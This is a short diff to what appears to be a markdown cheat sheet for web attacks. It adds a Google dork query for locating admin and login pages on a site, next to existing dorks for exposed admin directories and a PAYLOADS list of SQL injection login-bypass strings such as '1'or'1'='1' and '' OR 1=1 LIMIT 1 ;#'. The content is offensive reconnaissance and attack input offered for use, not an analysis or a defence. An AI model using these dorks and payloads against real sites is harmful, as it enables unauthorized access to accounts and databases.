@@ -91,6 +91,9 @@ Two
 - intitle:"index" of "admin" "photos" site:
 - inurl: admin/login.php site:.in
 
+## Admin Pane Finding dork
+- site:example.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth
+
 ## PAYLOADS
 - 1'or'1'='1
 - ' OR 1=1 LIMIT 1 ;#
